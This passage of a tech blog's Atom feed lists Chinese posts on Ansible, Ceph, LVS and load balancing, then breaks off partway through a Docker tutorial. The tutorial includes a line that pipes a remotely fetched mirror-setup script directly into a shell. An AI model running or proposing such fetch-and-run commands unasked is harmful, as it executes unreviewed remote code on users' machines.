    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Ansible自动化管理</title>
    <link href="https://marnm.github.io//posts/b45e213f/"/>
    <id>https://marnm.github.io//posts/b45e213f/</id>
    <published>2022-06-07T05:36:40.000Z</published>
    <updated>2022-06-07T05:46:04.433Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Ceph分布式存储</title>
    <link href="https://marnm.github.io//posts/e9abc941/"/>
    <id>https://marnm.github.io//posts/e9abc941/</id>
    <published>2022-06-07T05:36:20.000Z</published>
    <updated>2022-06-07T05:46:04.431Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>分布式存储概念</title>
    <link href="https://marnm.github.io//posts/49229134/"/>
    <id>https://marnm.github.io//posts/49229134/</id>
    <published>2022-06-07T05:36:10.000Z</published>
    <updated>2022-06-07T05:46:04.468Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Nginx-HAProxy实现七层负载均衡</title>
    <link href="https://marnm.github.io//posts/cfea2817/"/>
    <id>https://marnm.github.io//posts/cfea2817/</id>
    <published>2022-06-07T05:35:53.000Z</published>
    <updated>2022-06-07T05:46:04.458Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>LVS-IPTUN集群</title>
    <link href="https://marnm.github.io//posts/df68056c/"/>
    <id>https://marnm.github.io//posts/df68056c/</id>
    <published>2022-06-07T05:35:10.000Z</published>
    <updated>2022-06-07T05:46:04.452Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>LVS-DR集群</title>
    <link href="https://marnm.github.io//posts/be48d001/"/>
    <id>https://marnm.github.io//posts/be48d001/</id>
    <published>2022-06-07T05:34:54.000Z</published>
    <updated>2022-06-07T05:46:04.453Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>LVS-NAT集群</title>
    <link href="https://marnm.github.io//posts/dcf8e277/"/>
    <id>https://marnm.github.io//posts/dcf8e277/</id>
    <published>2022-06-07T05:34:48.000Z</published>
    <updated>2022-06-07T05:46:04.454Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Docker学习笔记</title>
    <link href="https://marnm.github.io//posts/4a3d459a/"/>
    <id>https://marnm.github.io//posts/4a3d459a/</id>
    <published>2022-06-07T05:26:19.000Z</published>
    <updated>2022-06-07T05:30:25.654Z</updated>
    
    <content type="html"><![CDATA[<h1 id="&#x5BB9;&#x5668;Docker&#x8BE6;&#x89E3;"><a href="#&#x5BB9;&#x5668;Docker&#x8BE6;&#x89E3;" class="headerlink" title="&#x5BB9;&#x5668;Docker&#x8BE6;&#x89E3;"></a>&#x5BB9;&#x5668;Docker&#x8BE6;&#x89E3;</h1><h2 id="&#x6982;&#x8FF0;"><a href="#&#x6982;&#x8FF0;" class="headerlink" title="&#x6982;&#x8FF0;"></a>&#x6982;&#x8FF0;</h2><p><strong>1.1 &#x57FA;&#x672C;&#x6982;&#x5FF5;&#xFF1A;</strong></p><p>Docker&#x662F;&#x4E00;&#x4E2A;&#x5F00;&#x6E90;&#x7684;&#x5E94;&#x7528;&#x5BB9;&#x5668;&#x5F15;&#x64CE;&#xFF0C;&#x57FA;&#x4E8E;Go&#x8BED;&#x8A00; &#x5E76;&#x9075;&#x4ECE;Apache2.0&#x534F;&#x8BAE;&#x5F00;&#x6E90;&#x3002;Docker&#x53EF;&#x4EE5;&#x8BA9;&#x5F00;&#x53D1;&#x8005;&#x6253;&#x5305;&#x4ED6;&#x4EEC;&#x7684;&#x5E94;&#x7528;&#x4EE5;&#x53CA;&#x4F9D;&#x8D56;&#x5305;&#x5230;&#x4E00;&#x4E2A;&#x8F7B;&#x91CF;&#x7EA7;&#x3001;&#x53EF;&#x79FB;&#x690D;&#x7684;&#x5BB9;&#x5668;&#x4E2D;&#xFF0C;&#x7136;&#x540E;&#x53D1;&#x5E03;&#x5230;&#x4EFB;&#x4F55;&#x6D41;&#x884C;&#x7684;Linux&#x673A;&#x5668;&#x4E0A;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x5B9E;&#x73B0;&#x865A;&#x62DF;&#x5316;&#x3002;&#x5BB9;&#x5668;&#x662F;&#x5B8C;&#x5168;&#x4F7F;&#x7528;&#x6C99;&#x7BB1;&#x673A;&#x5236;&#xFF0C;&#x76F8;&#x4E92;&#x4E4B;&#x95F4;&#x4E0D;&#x4F1A;&#x6709;&#x4EFB;&#x4F55;&#x63A5;&#x53E3;&#xFF08;&#x7C7B;&#x4F3C;iPhone&#x7684;app&#xFF09;&#xFF0C;&#x66F4;&#x91CD;&#x8981;&#x7684;&#x7684;&#x662F;&#x5BB9;&#x5668;&#x6027;&#x80FD;&#x5F00;&#x9500;&#x6781;&#x4F4E;&#x3002;<br><a id="more"></a><br><strong>1.2 &#x4F18;&#x52BF;&#xFF1A;</strong></p><p>Docker&#x8BA9;&#x5F00;&#x53D1;&#x8005;&#x53EF;&#x4EE5;&#x6253;&#x5305;&#x4ED6;&#x4EEC;&#x7684;&#x5E94;&#x7528;&#x4EE5;&#x53CA;&#x4F9D;&#x8D56;&#x5305;&#x5230;&#x4E00;&#x4E2A;&#x53EF;&#x79FB;&#x690D;&#x7684;&#x5BB9;&#x5668;&#x4E2D;&#xFF0C;&#x7136;&#x540E;&#x53D1;&#x5E03;&#x5230;&#x4EFB;&#x4F55;&#x6D41;&#x884C;&#x7684;Linux&#x673A;&#x5668;&#x4E0A;&#xFF0C;&#x4FBF;&#x53EF;&#x4EE5;&#x5B9E;&#x73B0;&#x865A;&#x62DF;&#x5316;&#x3002;Docker&#x6539;&#x53D8;&#x4E86;&#x865A;&#x62DF;&#x5316;&#x7684;&#x65B9;&#x5F0F;&#xFF0C;&#x4F7F;&#x5F00;&#x53D1;&#x8005;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x5C06;&#x81EA;&#x5DF1;&#x7684;&#x6210;&#x679C;&#x653E;&#x5165;Docker&#x4E2D;&#x8FDB;&#x884C;&#x7BA1;&#x7406;&#x3002;&#x65B9;&#x4FBF;&#x5FEB;&#x6377;&#x5DF2;&#x7ECF;&#x662F;Docker&#x7684;&#x6700;&#x5927;&#x4F18;&#x52BF;&#xFF0C;&#x8FC7;&#x53BB;&#x9700;&#x8981;&#x7528;&#x6570;&#x5929;&#x4E43;&#x81F3;&#x6570;&#x5468;&#x7684;&#x4EFB;&#x52A1;&#xFF0C;&#x5728;Docker&#x5BB9;&#x5668;&#x7684;&#x5904;&#x7406;&#x4E0B;&#xFF0C;&#x53EA;&#x9700;&#x8981;&#x6570;&#x79D2;&#x5C31;&#x80FD;&#x5B8C;&#x6210;&#x3002;</p><p>&#x8282;&#x7701;&#x5F00;&#x652F;&#xFF1A;<br>&#x4E00;&#x65B9;&#x9762;&#xFF0C;&#x4E91;&#x8BA1;&#x7B97;&#x65F6;&#x4EE3;&#x5230;&#x6765;&#xFF0C;&#x4F7F;&#x5F00;&#x53D1;&#x8005;&#x4E0D;&#x5FC5;&#x4E3A;&#x4E86;&#x8FFD;&#x6C42;&#x6548;&#x679C;&#x800C;&#x914D;&#x7F6E;&#x9AD8;&#x989D;&#x7684;&#x786C;&#x4EF6;&#xFF0C;Docker&#x6539;&#x53D8;&#x4E86;&#x9AD8;&#x6027;&#x80FD;&#x5FC5;&#x7136;&#x9AD8;&#x4EF7;&#x683C;&#x7684;&#x601D;&#x7EF4;&#x5B9A;&#x52BF;&#x3002;Docker&#x4E0E;&#x4E91;&#x7684;&#x7ED3;&#x5408;&#xFF0C;&#x8BA9;&#x4E91;&#x7A7A;&#x95F4;&#x5F97;&#x5230;&#x66F4;&#x5145;&#x5206;&#x7684;&#x5229;&#x7528;&#x3002;&#x4E0D;&#x4EC5;&#x89E3;&#x51B3;&#x4E86;&#x786C;&#x4EF6;&#x7BA1;&#x7406;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x4E5F;&#x6539;&#x53D8;&#x4E86;&#x865A;&#x62DF;&#x5316;&#x7684;&#x65B9;&#x5F0F;&#x3002;</p><p><strong>1.3 &#x4E0E;&#x4F20;&#x7EDF;VM&#x7279;&#x6027;&#x5BF9;&#x6BD4;&#xFF1A;</strong></p><p>&#x4F5C;&#x4E3A;&#x4E00;&#x79CD;&#x8F7B;&#x91CF;&#x7EA7;&#x7684;&#x865A;&#x62DF;&#x5316;&#x65B9;&#x5F0F;&#xFF0C;Docker&#x5728;&#x8FD0;&#x884C;&#x5E94;&#x7528;&#x4E0A;&#x8DDF;&#x4F20;&#x7EDF;&#x7684;&#x865A;&#x62DF;&#x673A;&#x65B9;&#x5F0F;&#x76F8;&#x6BD4;&#x5177;&#x6709;&#x663E;&#x8457;&#x7684;&#x4F18;&#x52BF;&#xFF1A;<br>Docker&#x5BB9;&#x5668;&#x5F88;&#x5FEB;&#xFF0C;&#x542F;&#x52A8;&#x548C;&#x505C;&#x6B62;&#x53EF;&#x4EE5;&#x5728;&#x6570;&#x79D2;&#x7EA7;&#x5B9E;&#x73B0;&#xFF0C;&#x8FD9;&#x76F8;&#x6BD4;&#x4F20;&#x7EDF;&#x7684;&#x865A;&#x62DF;&#x673A;&#x65B9;&#x5F0F;&#x8981;&#x5FEB;&#x5F97;&#x591A;&#x3002;<br>Docker&#x5BB9;&#x5668;&#x5BF9;&#x7CFB;&#x7EDF;&#x8D44;&#x6E90;&#x9700;&#x6C42;&#x5F88;&#x5C11;&#xFF0C;&#x4E00;&#x53F0;&#x4E3B;&#x673A;&#x4E0A;&#x53EF;&#x4EE5;&#x540C;&#x65F6;&#x8FD0;&#x884C;&#x6570;&#x5343;&#x4E2A;Docker&#x5BB9;&#x5668;&#x3002;<br>Docker&#x901A;&#x8FC7;&#x7C7B;&#x4F3C;Git&#x7684;&#x64CD;&#x4F5C;&#x6765;&#x65B9;&#x4FBF;&#x7528;&#x6237;&#x83B7;&#x53D6;&#x3001;&#x5206;&#x652F;&#x548C;&#x66F4;&#x65B0;&#x5E94;&#x7528;&#x955C;&#x50CF;&#xFF0C;&#x6307;&#x4EE4;&#x7B80;&#x660E;&#xFF0C;&#x5B66;&#x4E60;&#x6210;&#x672C;&#x8F83;&#x4F4E;&#x3002;<br>Docker&#x901A;&#x8FC7;Dockerfile&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x6765;&#x652F;&#x6301;&#x7075;&#x6D3B;&#x7684;&#x81EA;&#x52A8;&#x5316;&#x521B;&#x5EFA;&#x548C;&#x90E8;&#x7F72;&#x673A;&#x5236;&#xFF0C;&#x63D0;&#x9AD8;&#x5DE5;&#x4F5C;&#x6548;&#x7387;&#x3002;<br>Docker&#x5BB9;&#x5668;&#x9664;&#x4E86;&#x8FD0;&#x884C;&#x5176;&#x4E2D;&#x7684;&#x5E94;&#x7528;&#x4E4B;&#x5916;&#xFF0C;&#x57FA;&#x672C;&#x4E0D;&#x6D88;&#x8017;&#x989D;&#x5916;&#x7684;&#x7CFB;&#x7EDF;&#x8D44;&#x6E90;&#xFF0C;&#x4FDD;&#x8BC1;&#x5E94;&#x7528;&#x6027;&#x80FD;&#x7684;&#x540C;&#x65F6;&#xFF0C;&#x5C3D;&#x91CF;&#x51CF;&#x5C0F;&#x7CFB;&#x7EDF;&#x5F00;&#x9500;&#x3002;<br>Docker&#x5229;&#x7528;Linux&#x7CFB;&#x7EDF;&#x4E0A;&#x7684;&#x591A;&#x79CD;&#x9632;&#x62A4;&#x673A;&#x5236;&#x5B9E;&#x73B0;&#x4E86;&#x4E25;&#x683C;&#x53EF;&#x9760;&#x7684;&#x9694;&#x79BB;&#x3002;&#x4ECE;1.3&#x7248;&#x672C;&#x5F00;&#x59CB;&#xFF0C;Docker&#x5F15;&#x5165;&#x4E86;&#x5B89;&#x5168;&#x9009;&#x9879;&#x548C;&#x955C;&#x50CF;&#x7B7E;&#x540D;&#x673A;&#x5236;&#xFF0C;&#x6781;&#x5927;&#x5730;&#x63D0;&#x9AD8;&#x4E86;&#x4F7F;&#x7528;Docker&#x7684;&#x5B89;&#x5168;&#x6027;&#x3002;  </p><table><thead><tr><th>&#x7279;&#x6027;</th><th>&#x5BB9;&#x5668;</th><th>&#x865A;&#x62DF;&#x673A;</th></tr></thead><tbody><tr><td>&#x542F;&#x52A8;&#x901F;&#x5EA6;</td><td>&#x79D2;&#x7EA7;</td><td>&#x5206;&#x949F;&#x7EA7;</td></tr><tr><td>&#x786C;&#x76D8;&#x4F7F;&#x7528;</td><td>&#x4E00;&#x822C;&#x4E3A;MB</td><td>&#x4E00;&#x822C;&#x7ED9;GB</td></tr><tr><td>&#x6027;&#x80FD;</td><td>&#x63A5;&#x8FD1;&#x539F;&#x751F;</td><td>&#x5F31;&#x4E8E;&#x539F;&#x751F;</td></tr><tr><td>&#x7CFB;&#x7EDF;&#x652F;&#x6301;&#x91CF;</td><td>&#x5355;&#x673A;&#x652F;&#x6301;&#x4E0A;&#x5343;&#x4E2A;&#x5BB9;&#x5668;</td><td>&#x4E00;&#x822C;&#x51E0;&#x5341;&#x4E2A;</td></tr><tr><td>&#x9694;&#x79BB;&#x6027;</td><td>&#x5B89;&#x5168;&#x9694;&#x79BB;</td><td>&#x5B89;&#x5168;&#x9694;&#x79BB;</td></tr></tbody></table><p><strong>1.4 &#x57FA;&#x7840;&#x67B6;&#x6784;</strong></p><p>Docker&#x4F7F;&#x7528;&#x5BA2;&#x6237;&#x7AEF;-&#x670D;&#x52A1;&#x5668;(C/S)&#x67B6;&#x6784;&#x6A21;&#x5F0F;&#xFF0C;&#x4F7F;&#x7528;&#x8FDC;&#x7A0B;API&#x6765;&#x7BA1;&#x7406;&#x548C;&#x521B;&#x5EFA;Docker&#x5BB9;&#x5668;&#x3002;</p><p>Docker&#x5BB9;&#x5668;&#x901A;&#x8FC7;Docker&#x955C;&#x50CF;&#x6765;&#x521B;&#x5EFA;</p><p>&#x5BB9;&#x5668;&#x4E0E;&#x955C;&#x50CF;&#x7684;&#x5173;&#x7CFB;&#x7C7B;&#x4F3C;&#x4E8E;&#x9762;&#x5411;&#x5BF9;&#x8C61;&#x7F16;&#x7A0B;&#x4E2D;&#x7684;&#x5BF9;&#x8C61;&#x4E0E;&#x7C7B;&#x3002;</p><table><thead><tr><th>Docker</th><th>&#x9762;&#x5411;&#x5BF9;&#x8C61;</th></tr></thead><tbody><tr><td>&#x5BB9;&#x5668;</td><td>&#x5BF9;&#x8C61;</td></tr><tr><td>&#x955C;&#x50CF;</td><td>&#x7C7B;</td></tr></tbody></table><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src=".png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p><strong>1.5 Docker&#x6280;&#x672F;&#x7684;&#x57FA;&#x7840;&#xFF1A;</strong></p><ul><li>namespace&#xFF0C; &#x5BB9;&#x5668;&#x9694;&#x79BB;&#x7684;&#x57FA;&#x7840;&#xFF0C;&#x4FDD;&#x8BC1;A&#x5BB9;&#x5668;&#x770B;&#x4E0D;&#x5230;B&#x5BB9;&#x5668;&#x3002;6&#x4E2A;&#x547D;&#x540D;&#x7A7A;&#x95F4;&#xFF1A;User, Mnt, Network, UTS, IPC, PID</li><li>cgroups, &#x5BB9;&#x5668;&#x8D44;&#x6E90;&#x7EDF;&#x8BA1;&#x548C;&#x9694;&#x79BB;&#x3002;&#x4E3B;&#x8981;&#x7528;&#x5230;&#x7684;cgroups&#x5B50;&#x7CFB;&#x7EDF;&#xFF1A;CPU, blkio, device, freezer, memory</li><li>unionfs&#xFF0C; &#x5178;&#x578B;&#xFF1A;aufs/overlayfs&#xFF0C;&#x5206;&#x5C42;&#x955C;&#x50CF;&#x5B9E;&#x73B0;&#x7684;&#x57FA;&#x7840;</li></ul><p><strong>1.6 Docker&#x7EC4;&#x4EF6;&#xFF1A;</strong></p><ul><li>docker Client&#x5BA2;&#x6237;&#x7AEF;&#x2014;&#x2014;&#x2014;&#x2014;&gt;&#x5411;docker&#x670D;&#x52A1;&#x5668;&#x8FDB;&#x7A0B;&#x53D1;&#x8D77;&#x8BF7;&#x6C42;&#xFF0C;&#x5982;&#x521B;&#x5EFA;&#x3001;&#x505C;&#x6B62;&#x3001;&#x9500;&#x6BC1;&#x5BB9;&#x5668;&#x7B49;&#x64CD;&#x4F5C;</li><li>docker Server&#x670D;&#x52A1;&#x5668;&#x8FDB;&#x7A0B;&#x2014;&#x2014;&#x2014;&#x2014;&gt;&#x5904;&#x7406;&#x6240;&#x6709;docker&#x7684;&#x8BF7;&#x6C42;&#xFF0C;&#x7BA1;&#x7406;&#x6240;&#x6709;&#x5BB9;&#x5668;</li><li>docker Registry&#x955C;&#x50CF;&#x4ED3;&#x5E93;&#x2014;&#x2014;&#x2014;&#x2014;&gt;&#x955C;&#x50CF;&#x5B58;&#x653E;&#x7684;&#x4E2D;&#x592E;&#x4ED3;&#x5E93;&#xFF0C;&#x53EF;&#x770B;&#x4F5C;&#x662F;&#x5B58;&#x653E;&#x4E8C;&#x8FDB;&#x5236;&#x7684;scm</li></ul><h2 id="&#x4E8C;&#x3001;&#x5B89;&#x88C5;&#x90E8;&#x7F72;"><a href="#&#x4E8C;&#x3001;&#x5B89;&#x88C5;&#x90E8;&#x7F72;" class="headerlink" title="&#x4E8C;&#x3001;&#x5B89;&#x88C5;&#x90E8;&#x7F72;"></a>&#x4E8C;&#x3001;&#x5B89;&#x88C5;&#x90E8;&#x7F72;</h2><p><strong>2.1 &#x51C6;&#x5907;&#x6761;&#x4EF6;</strong></p><p>&#x76EE;&#x524D;&#xFF0C;CentOS&#x4EC5;&#x53D1;&#x884C;&#x7248;&#x672C;&#x4E2D;&#x7684;&#x5185;&#x6838;&#x652F;&#x6301;Docker&#x3002;<br>Docker&#x8FD0;&#x884C;&#x5728;CentOS 7&#x4E0A;&#xFF0C;&#x8981;&#x6C42;&#x7CFB;&#x7EDF;&#x4E3A;64&#x4F4D;&#x3001;&#x7CFB;&#x7EDF;&#x5185;&#x6838;&#x7248;&#x672C;&#x4E3A;3.10&#x4EE5;&#x4E0A;&#x3002;<br>Docker&#x8FD0;&#x884C;&#x5728;CentOS-6.5&#x6216;&#x66F4;&#x9AD8;&#x7684;&#x7248;&#x672C;&#x7684;CentOS&#x4E0A;&#xFF0C;&#x8981;&#x6C42;&#x7CFB;&#x7EDF;&#x4E3A;64&#x4F4D;&#x3001;&#x7CFB;&#x7EDF;&#x5185;&#x6838;&#x7248;&#x672C;2.6.32-431&#x6216;&#x8005;&#x66F4;&#x9AD8;&#x7248;&#x672C;</p><p><strong>2.2 &#x5B89;&#x88C5;docker</strong><br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yum install docker -y</span><br><span class="line">systemctl start docker</span><br><span class="line">systemctl enable docker</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>2.3 &#x57FA;&#x672C;&#x547D;&#x4EE4;</strong><br></p><figure class="highlight dockerfile"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker search centos    <span class="comment"># &#x641C;&#x7D22;&#x955C;&#x50CF;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x9ED8;&#x8BA4;&#x4ECE;&#x56FD;&#x5916;&#x62C9;&#x53D6;&#xFF0C;&#x901F;&#x5EA6;&#x5F88;&#x6162;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;daocloud&#x914D;&#x7F6E;&#x52A0;&#x901F;<br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> &#x811A;&#x672C;&#x5199;&#x5165;</span></span><br><span class="line">curl -sSL https://get.daocloud.io/daotools/set_mirror.sh | sh -s http://d6f11267.m.daocloud.io</span><br><span class="line"></span><br><span class="line">echo &quot;{\&quot;registry-mirrors\&quot;: [\&quot;http://d6f11267.m.daocloud.io\&quot;]}&quot;&gt; /etc/docker/daemon.json</span><br><span class="line">systemctl restart docker  # &#x91CD;&#x542F;&#x751F;&#x6548;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6839;&#x636E;&#x9700;&#x6C42;&#x62C9;&#x53D6;&#x955C;&#x50CF;</p><pre><code>docker pull docker.io/ansible/centos7-ansible</code></pre><p>&#x62C9;&#x53D6;search&#x5230;&#x7684;&#x5168;&#x90E8;&#x955C;&#x50CF;  </p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in `docker search centos | awk &apos;!/NAME/{print $2}&apos;`; do docker pull $i; done</span><br></pre></td></tr></tbody></table></figure><p>&#x67E5;&#x770B;&#x672C;&#x5730;&#x955C;&#x50CF;</p><pre><code>docker images</code></pre><p><strong>2.4 &#x547D;&#x4EE4;&#x6574;&#x7406;</strong></p><p>&#x5BB9;&#x5668;&#x64CD;&#x4F5C;&#xFF1A;<br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">docker create    # &#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x5BB9;&#x5668;&#x4F46;&#x662F;&#x4E0D;&#x542F;&#x52A8;</span><br><span class="line">docker run       # &#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x5BB9;&#x5668;&#x5E76;&#x542F;&#x52A8;</span><br><span class="line">docker stop      # &#x505C;&#x6B62;&#x5BB9;&#x5668;&#x8FD0;&#x884C;&#xFF0C;&#x53D1;&#x9001;&#x4FE1;&#x53F7;SIGTERM</span><br><span class="line">docker start     # &#x542F;&#x52A8;&#x4E00;&#x4E2A;&#x505C;&#x6B62;&#x72B6;&#x6001;&#x7684;&#x5BB9;&#x5668;</span><br><span class="line">docker rm        # &#x5220;&#x9664;&#x4E00;&#x4E2A;&#x5BB9;&#x5668;</span><br><span class="line">docker kill      # &#x53D1;&#x9001;&#x4FE1;&#x53F7;&#x7ED9;&#x5BB9;&#x5668;&#xFF0C;&#x9ED8;&#x8BA4;SIGKILL</span><br><span class="line">docker attach    # &#x8FDE;&#x63A5;&#xFF08;&#x8FDB;&#x5165;&#xFF09;&#x5230;&#x4E00;&#x4E2A;&#x6B63;&#x5728;&#x8FD0;&#x884C;&#x7684;&#x5BB9;&#x5668;</span><br><span class="line">docker wait      # &#x963B;&#x585E;&#x4E00;&#x4E2A;&#x5BB9;&#x5668;&#xFF0C;&#x77E5;&#x9053;&#x5BB9;&#x5668;&#x505C;&#x6B62;&#x8FD0;&#x884C;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x83B7;&#x53D6;&#x5BB9;&#x5668;&#x4FE1;&#x606F;&#xFF1A;<br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">docker ps        # &#x663E;&#x793A;&#x72B6;&#x6001;&#x4E3A;&#x8FD0;&#x884C;&#xFF08;up&#xFF09;&#x7684;&#x5BB9;&#x5668;</span><br><span class="line">docker ps -a     # &#x663E;&#x793A;&#x6240;&#x6709;&#x5BB9;&#x5668;&#xFF0C;&#x5305;&#x62EC;&#x8FD0;&#x884C;&#x4E2D;(up)&#x7684;&#x548C;&#x9000;&#x51FA;&#x7684;(exited&#xFF09;</span><br><span class="line">docker inspect   # &#x6DF1;&#x5165;&#x5BB9;&#x5668;&#x5185;&#x90E8;&#x83B7;&#x53D6;&#x5BB9;&#x5668;&#x6240;&#x6709;&#x4FE1;&#x606F;</span><br><span class="line">docker logs      # &#x67E5;&#x770B;&#x5BB9;&#x5668;&#x65E5;&#x5FD7;(stdout/stderr)</span><br><span class="line">docker events    # &#x5F97;&#x5230;docker&#x670D;&#x52A1;&#x5668;&#x7684;&#x5B9E;&#x65F6;&#x4E8B;&#x4EF6;</span><br><span class="line">docker port      # &#x663E;&#x793A;&#x5BB9;&#x5668;&#x7684;&#x7AEF;&#x53E3;&#x6620;&#x5C04;</span><br><span class="line">docker top       # &#x663E;&#x793A;&#x5BB9;&#x5668;&#x7684;&#x8FDB;&#x7A0B;&#x4FE1;&#x606F;</span><br><span class="line">docker diff      # &#x663E;&#x793A;&#x5BB9;&#x5668;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x7684;&#x524D;&#x540E;&#x53D8;&#x5316;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5BFC;&#x51FA;&#x5BB9;&#x5668;&#xFF1A;<br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span 